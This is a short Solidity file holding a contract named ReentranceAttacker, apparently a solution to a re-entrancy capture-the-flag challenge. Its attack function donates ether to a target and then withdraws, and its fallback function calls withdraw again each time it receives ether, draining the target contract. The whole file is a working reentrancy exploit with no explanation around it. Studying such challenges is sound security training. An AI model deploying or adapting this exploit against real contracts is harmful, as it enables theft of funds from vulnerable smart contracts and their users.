pragma solidity ^0.7.3;

interface IReEntrancyChallenge {

    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
    IReEntrancyChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IReEntrancyChallenge(challengeAddress);
    }

    function attack() external payable {
        challenge.donate{value: msg.value}(address(this));
        challenge.withdraw(1 ether);
    }

    fallback() external payable {
        challenge.withdraw(1 ether);
    }
}
